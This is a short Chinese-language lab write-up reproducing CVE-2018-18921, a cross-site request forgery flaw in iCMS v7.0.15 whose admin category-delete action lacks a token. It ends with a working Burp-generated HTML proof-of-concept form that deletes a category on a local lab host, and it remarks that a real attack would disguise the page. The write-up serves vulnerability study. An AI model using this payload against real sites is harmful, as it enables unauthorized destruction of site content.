### 前言  
今天跟着复现了一个cve-2018-18921是csrf漏洞，虽然csrf现在很少见，也真的很难被利用了，不过了解一下也是ok的。然后就找了个cms简单找了一个，还真找到了。找的是icms的版本v7.0.15  
### 背景  csrf
跨站请求伪造，从web应用信任的用户那里传输未经授权的命令   
### 发现利用
登录后台，可以看到用户是含有反csrf-token的，基本上要执行大部分操作都必须带着这个token去执行，但也有例外。
在admincp.php?app=article_category中可以看到管理栏目的时候，删除时未带有token直接执行了，那么如果攻击者想使坏删掉各个栏目的话他就可以构造一定的
删除命令的网页然后发送给admin管理员（当然这也是为什么csrf现在很难被利用的原因，很难找到真正的admin管理员，管理员也不见得会去执行你想要的操作）不管这里就不管啦，我就是管理员哈哈  

 ![avatar](pictures/1.png)   

比如点击下面的poc就会发现cid=1的栏目已经被删除，其下所属的文章也没了。我用的poc是直接用burpsuite抓包生成的极其的简陋，在实际中还是需要对poc进行伪装
  
  
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.86.138/iCMS-v7.0.15/admincp.php">
      <input type="hidden" name="app" value="article&#95;category" />
      <input type="hidden" name="do" value="del" />
      <input type="hidden" name="cid" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
